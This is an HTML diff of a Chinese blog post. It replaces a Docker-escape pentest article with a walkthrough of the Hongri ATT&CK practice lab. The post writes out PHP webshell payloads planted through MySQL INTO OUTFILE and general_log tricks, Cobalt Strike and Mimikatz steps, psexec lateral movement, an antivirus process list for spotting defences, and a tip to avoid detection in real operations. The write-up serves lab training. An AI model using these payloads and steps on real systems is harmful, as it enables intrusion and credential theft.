@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网渗透之docker逃逸至域控, null">
+    <meta name="keywords" content="ATT&amp;CK 红日靶场实战演习心得笔记(一), null">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网渗透之docker逃逸至域控 | null</title>
+    <title>ATT&amp;CK 红日靶场实战演习心得笔记(一) | null</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网渗透之docker逃逸至域控</h1>
+                    <h1 class="description center-align post-title">ATT&amp;CK 红日靶场实战演习心得笔记(一)</h1>
                 </div>
             </div>
         </div>
@@ -328,10 +328,6 @@
                                 <span class="chip bg-color">内网渗透</span>
                             </a>
                         
-                            <a href="/tags/docker/">
-                                <span class="chip bg-color">docker</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -362,14 +358,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    988
+                    3.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    11 分
                 </div>
                 
 
@@ -393,12 +389,9 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <blockquote>
-<p>人的一生除去睡眠只有一万多天～ 人与人的不同在于：你是真的活了一万多天，还是仅仅生活了一天，却重复了一万多次！</p>
+<p>20多岁了，我考虑过悍马，也看过野马，还想过宝马，后来看了看海马，最后选择了爱玛，付款的时候还是选择了沙琪玛</p>
 </blockquote>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    清晰的记得19年10月左右，有个职业技能赛打进了线下，线下决赛模式就是综合靶场渗透。当时还信心满满，可惜考点竟然有个docker逃逸，当时没有了解过docke逃逸，最终没有取得一个好的成绩。</p>
-<p>​    终于，，，最近几天无意中找到了那套靶机环境，特意重新做了下，发现期间也是有一些坑，所以特意写下此篇文章分享给大家～<br>​</p>
-<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>靶机地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640.png" alt="img"></p>
+<h2 id="0x01-内网结构及靶机环境搭建"><a href="#0x01-内网结构及靶机环境搭建" class="headerlink" title="0x01 内网结构及靶机环境搭建"></a>0x01 内网结构及靶机环境搭建</h2><p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415170947063.png" alt="图片"></p>
 <table>
 <thead>
 <tr>
@@ -411,50 +404,321 @@
 <tbody><tr>
 <td><strong>VM1</strong></td>
 <td>Web服务器</td>
-<td>ubuntu x64</td>
-<td>NAT：192.168.213.136主机：192.168.138.135</td>
+<td>windows7 x64</td>
+<td>NAT：192.168.213.130主机：192.168.52.137</td>
 </tr>
 <tr>
 <td><strong>VM2</strong></td>
 <td>域成员</td>
-<td>windows 7</td>
-<td>主机：192.168.138.136</td>
+<td>win2k3 Metasploitable</td>
+<td>主机：192.168.52.141</td>
 </tr>
 <tr>
 <td><strong>VM3</strong></td>
 <td>域控服务器</td>
 <td>windows server 2008 R2 x64</td>
-<td>主机：192.168.138.137</td>
+<td>主机：192.168.52.138</td>
 </tr>
 </tbody></table>
-<h2 id="0x02-外网打点"><a href="#0x02-外网打点" class="headerlink" title="0x02 外网打点"></a>0x02 外网打点</h2><p>扫描端口也不难发现，一共有三处web服务，分别对应8001-3，因主要讲的是docker逃逸，所以外网打点不详细介绍，这里以st2-045为主。其他两个</p>
-<p>则分别是phpmyadmin getshell 和tomcat 漏洞利用。</p>
-<p>直接利用st2类似的工具拿shell</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105844268.png" alt="img"></p>
-<p>这里发现通过ls -al / 发现了.dockerenv文件，通过这一信息基本上就可以确定当前环境是在docker环境下</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105847257.png" alt="img"></p>
-<p>通过fdisk -l命令可以发现看到磁盘的挂载情况，通过这一特性可以发现此docker环境是开启了特权模式，所以可以通过这一模式来获取物理机的shell。</p>
+<p>注：以上靶机环境均来自<strong>红日安全团队</strong></p>
+<p><strong>靶机下载地址：</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#screenshot">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#screenshot</a></strong><br>以上靶机所有统一密码为：**<strong>hongrisec@2019</strong></p>
+<p>我这里改成了 <strong>admin@123</strong></p>
+<h3 id="搭建环境注意事项"><a href="#搭建环境注意事项" class="headerlink" title="搭建环境注意事项"></a>搭建环境注意事项</h3><ol>
+<li><p>vm1 靶机 需要自己去启动phpstudy，默认是没有开启的，这里我当时还卡了一会，真的tcccccl.<img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415171038745.png" alt="图片"></p>
+</li>
+<li><p>配置网络的时候，只需要改第一个靶机也就是vm1（windows 7的），新加一个外网环境的网卡就ok，可以是nat也可以是桥接，另外一个必须得是仅主机模式，默认的地址是 192.168.52.0/24 ,不要改成其他的，因为主机加入域的时候，dns 是域控的ip ,写死的192.168.52.130 。</p>
+</li>
+</ol>
+<h2 id="0x02-外网getshell"><a href="#0x02-外网getshell" class="headerlink" title="0x02 外网getshell"></a>0x02 <strong>外网getshell</strong></h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>正常打开是一个php探针</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173255527.png" alt="图片"></p>
+<p>利用点：</p>
+<ol>
+<li><p>检查php禁用了哪些函数</p>
+</li>
+<li><p>爆破数据库密码</p>
+</li>
+</ol>
+<p>目录扫描（这里用的是dirsearch)</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173301179.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173258711.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173303287.png" alt="图片"></p>
+<p>PS：ctf打的比较多，如果日后遇到其他服务器有墙的情况下，可以设置线程的方式来进行扫描</p>
+<p>（dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429）</p>
+<p>具体细节不一一描述，</p>
 <blockquote>
-<p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
+<p>综上所述</p>
+<p>IP地址：192.168.213.130</p>
+<p>主机信息：Windows NT STU1 6.1 build 7601 (Windows 7 Business Edition Service Pack 1) i586</p>
+<p>服务器解析引擎：Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</p>
+<p>网站绝对路径：C:/phpStudy/WWW</p>
+<p>被禁用函数：无</p>
+<p>网站类型：yxcms，有后台</p>
+<p>数据库账号和密码：root/root</p>
+<p>phpmyAdmin: <a target="_blank" rel="noopener" href="http://192.168.213.130/phpmyAdmin/">http://192.168.213.130/phpmyAdmin/</a></p>
 </blockquote>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105851061.png" alt="img"></p>
-<p>这里获取物理机的shell是通过ssh写密钥的方式。</p>
-<p>先在kali生成密钥</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105854799.png" alt="img"></p>
-<p>再把公钥idlab.pub直接写进.ssh/authorized_keys里面</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105857055.png" alt="img"></p>
-<p>这里为了后面传文件方便，用了ssh连接的工具，如果用命令的话也可以，ssh -i 即可。</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105859398.png" alt="img"></p>
-<p>(ps: 除此意外使用cve-2019-5736也可以实现docker逃逸，就是稍微麻烦了点～</p>
-<p>exp地址：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC%EF%BC%89">https://github.com/Frichetten/CVE-2019-5736-PoC）</a></p>
-<h2 id="0x03-内网渗透"><a href="#0x03-内网渗透" class="headerlink" title="0x03 内网渗透"></a>0x03 内网渗透</h2><p>使用msf自带的ms17模块可以发现无法获取shell，会一直提示fail，这里我曾经在真实环境上也遇见过，当时记得是内网有台防火墙给拦截了～ 这里很明显是没有防火墙设备的，具体原因没去研究过，但是经过好几次的尝试应该就是代理这一块协议的问题。因为我直接连接这台主机是可以打出来的。</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105904037.png" alt="img"></p>
-<p>但是我们依然可以绕过去，通过永恒之蓝的双倍脉冲模块</p>
-<p>（Eternalblue_doublepulsar）来获取会话</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p>
-<p>（通过这种方式也可以绕过一些waf）</p>
-<p><img src="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/640-20210415105907742.png" alt="img"></p>
-<p>后面则是通过mimikatz抓取用户的密码，whoami /all获取用户的sid，再利用ms14-068生成票据即可获取域管理员的权限。再上传mimikatz即可获取域管理员的密码，这些操作几乎和上节内容相似，就不演示～ 至此内网渗透完毕</p>
+<h3 id="mysql-数据库日志getshell"><a href="#mysql-数据库日志getshell" class="headerlink" title="mysql 数据库日志getshell"></a>mysql 数据库日志getshell</h3><p>爆破拿到数据库账号密码后，又发现有phpmyAdmin，所以想拿到shell就有很多办法了。</p>
+<p>最常见的就是</p>
+<pre class="line-numbers language-none"><code class="language-none">select &#39;&lt;?php eval($_POST[rh]); ?&gt;&#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;ma.php&#39;;
+select load_file(&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;rh.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>但是这里是行不通，所以可以通过mysql版本&gt;5.0这一特性来getshell，</p>
+<p>因为mysql5.0以上会创建日志文件，可以通过修改日志的保存路径来getshell</p>
+<p>操作步骤：</p>
+<p>SHOW VARIABLES LIKE ‘general%’</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173310634.png" alt="图片"></p>
+<p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
+<p>general log file 指的是日志的保存路径。（上面显示的是我已经改好的，默认的是OFF，且路径不在web目录下，应该是在数据库的目录下）</p>
+<p>然后：</p>
+<ol>
+<li><p>开启日志存储</p>
+</li>
+<li><p>修改日志保存路径</p>
+</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">set global general_log &#x3D; &quot;ON&quot;;set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;rh.php&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>这是为了让数据库记录我们输入的语句，从而写入木马</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173313365.png" alt="图片"></p>
+<ol start="4">
+<li>然后直接用蚁剑连接即可</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173315228.png" alt="图片"></p>
+<h3 id="文件上传getshell"><a href="#文件上传getshell" class="headerlink" title="文件上传getshell"></a>文件上传getshell</h3><p>除此之外，还可以通过cms的漏洞来进行getshell</p>
+<p>在网页上看到了用户名和密码（在正常的站当中很少会出现这样的情况，但是我依然可以通过这样的弱口令去尝试，尤其是一些旁站，弱口令是最容易入手的一个环节）</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173319225.png" alt="图片"></p>
+<p>登陆进去后直接编辑对应的php文件，然后找到对应的文件即可getshell，这里靶机是自留了一个后门。</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173322039.png" alt="图片"></p>
+<h2 id="0x03-基于CobaltStrike的内网渗透"><a href="#0x03-基于CobaltStrike的内网渗透" class="headerlink" title="0x03 基于CobaltStrike的内网渗透"></a>0x03 基于CobaltStrike的内网渗透</h2><p>由于本靶机全部都是windows环境，而且均没有使用杀毒软件，所以用cobaltstrike 是最佳之选了。当然在后面我也会介绍其他的几种用法～～～</p>
+<p>首先开启服务端, 这里也可以通过用<strong>screen</strong>命令来后台运行</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173326651.png" alt="图片"></p>
+<p>客户端看个人情况，有些人下载没有去编译客户端，所以需要使用下面的命令打开：</p>
+<p>java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</p>
+<ol>
+<li>首先利用cs监听一个端口</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173328951.png" alt="图片"></p>
+<ol start="2">
+<li>生成一个windows64位的木马，因靶机环境没有装杀毒软件，所以这里没有用免杀马，后续文章将会具体介绍各种免杀马</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173335603.png" alt="图片"></p>
+<ol start="3">
+<li><p>生成的木马放到win7虚拟机中运行即可获取shell，可以发现是管理员权限。 </p>
+<p>（注：拿到shell后一定要设置心跳值，默认的为60秒，所以执行命令等操作都会很慢，做实验的话设置0或者1就行。但平时实战中尽量设置高点，不然容易被检测到）**</p>
+</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173337833.png" alt="图片"></p>
+<ol start="4">
+<li><p>拿到shell后可以基本的信息收集一波, 如 net user 、 whoami、hostname等等。当然我平时基本上就是一条命令搞定-systeminfo，基本上一条命令就能一目了然。（小知识：如果嫌看的麻烦，几条命令可以快速的知道操作系统和版本：</p>
+<p>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>
+<p>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p>
+<p>查询已安装的软件及版本信息：wmic product get name,version</p>
+</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173431352.png" alt="图片"></p>
+<ol start="5">
+<li>其次就是看系统进程，一般主要都是为了查看有没有一些杀毒软件，这里是没有，也不详细介绍了。另外附带一个常见的杀软进程表：</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>进程名</th>
+<th><strong>软件</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360sd.exe</td>
+<td>360 杀毒</td>
+</tr>
+<tr>
+<td>360tray.exe</td>
+<td>360 实时保护</td>
+</tr>
+<tr>
+<td>ZhuDongFangYu.exe</td>
+<td>360 主动防御</td>
+</tr>
+<tr>
+<td>KSafeTray.exe</td>
+<td>金山卫士</td>
+</tr>
+<tr>
+<td>SafeDogUpdateCenter.exe</td>
+<td>安全狗</td>
+</tr>
+<tr>
+<td>McAfee</td>
+<td>McShield.exe</td>
+</tr>
+<tr>
+<td>egui.exe</td>
+<td>NOD32</td>
+</tr>
+<tr>
+<td>AVP.exe</td>
+<td>卡巴斯基</td>
+</tr>
+<tr>
+<td>avguard.exe</td>
+<td>小红伞</td>
+</tr>
+<tr>
+<td>bdagent.exe</td>
+<td>BitDefender</td>
+</tr>
+<tr>
+<td>QQPCRTP.exe</td>
+<td>QQ电脑管家</td>
+</tr>
+<tr>
+<td>mssecess.exe</td>
+<td>微软杀毒</td>
+</tr>
+<tr>
+<td>BaiduSdSvc.exe</td>
+<td>百度杀软</td>
+</tr>
+<tr>
+<td>rfwmain.exe</td>
+<td>瑞星防火墙</td>
+</tr>
+<tr>
+<td>beikesan.exe</td>
+<td>贝壳云安全</td>
+</tr>
+<tr>
+<td>KSWebShield.exe</td>
+<td>金山网盾</td>
+</tr>
+<tr>
+<td>V3Svc.exe</td>
+<td>安博士V3</td>
+</tr>
+<tr>
+<td>remupd.exe</td>
+<td>熊猫卫士</td>
+</tr>
+<tr>
+<td>vba32lder.exe</td>
+<td>vb32杀毒</td>
+</tr>
+<tr>
+<td>K7TSecurity.exe</td>
+<td>K7杀毒</td>
+</tr>
+</tbody></table>
+<ol start="6">
+<li>此环境 重点讲的还是域，所以还是重点提下域环境的收集。</li>
+</ol>
+<ul>
+<li>那什么是域呢？</li>
+</ul>
+<blockquote>
+<p>域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。身份验证在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p>
+</blockquote>
+<ul>
+<li>怎么确定拿到的shell是否存在域呢？</li>
+</ul>
+<p>1）使用 net config workstation </p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173437851.png" alt="图片"></p>
+<p>2）使用 <code>ipconfig /all</code> 查看 <code>DNS</code> 服务器</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173440346.png" alt="图片"></p>
+<p>3） 像下面我在另外一个没有域环境的windows主机执行该命令会发现显示的是工作者，这种的肯定是不存在域的。 <strong>（注：如果发生系统错误5，则说明是存在域的，只是当前用户不是域用户而已）</strong></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173442541.png" alt="图片"></p>
+<p>4）由于文章过长，这里就不一一的贴上对应命令的图片了，对域的一些其他的信息收集命令：</p>
+<blockquote>
+<p>获取域内用户的详细信息，如用户名、描述信息、SID域名等：<code>wmic useraccount get /all</code></p>
+<p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p>
+<p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p>
+<p>获取域密码信息：<code>net accounts /domain</code></p>
+<p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p>
+</blockquote>
+<ol start="7">
+<li>基本的信息搜集后，确认有域用户，就可以直接进行内网渗透了，因是管理员权限，所以可以尝试是否能提权，这里可以使用cs自带的提权插件进行提权，最终发现svc-exe插件可以进行提取。</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173449885.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173452317.png" alt="图片"></p>
+<ol start="8">
+<li>提权成功后就可以开始打内网了，执行ipconfig命令是可以看到存在两个网卡，分别为：</li>
+</ol>
+<p>192.168.213.130（外网）</p>
+<p>192.168.52.137（内网）</p>
+<p>然后使用cs自带的端口扫描工具对192.168.52.0/24进行扫描</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173454387.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173637191.png" alt="图片"></p>
+<ol start="9">
+<li>发现确实内网还存在其他两台存活主机，并且发现均开放了445端口，基本断定是两台windows系统的主机，这个实话可以联想到445端口弱口令、永恒之蓝等等</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173642578.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415174527533.png" alt="图片"></p>
+<ol start="10">
+<li>一步一步的来，先利用cs自带的Minikatz（密码抓取神器）获取当前系统所有用户的一些</li>
+</ol>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173645196.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173647658.png" alt="图片"></p>
+<ol start="11">
+<li>现在已经拿到了用户名和密码，且内网其他两台机器开放了445端口，所以可以尝试使用抓取到的用户和密码通过psexec进行登陆。</li>
+</ol>
+<blockquote>
+<p>psExec是微软pstools工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。</p>
+<p>psExec能够在命令行下在对方没有开启telnet服务的时候返回一个半交互的命令行，像telnet客户端一样。非常方便我们的工作，之所以叫半交互是因为这个命令行不能够执行一条命令中有交互的回显，比如runas的密码输入</p>
+</blockquote>
+<p>在登陆之前需要利用cs派生SMB Beacon</p>
+<blockquote>
+<p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽,  也可以用此特点绕过一些防火墙</p>
+</blockquote>
+<p>这里使用的是4.2版本的cs，所以跟3.x的会略有不同，其原理一样</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173651619.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173653799.png" alt="图片"></p>
+<p>点击运行后即可获取shell</p>
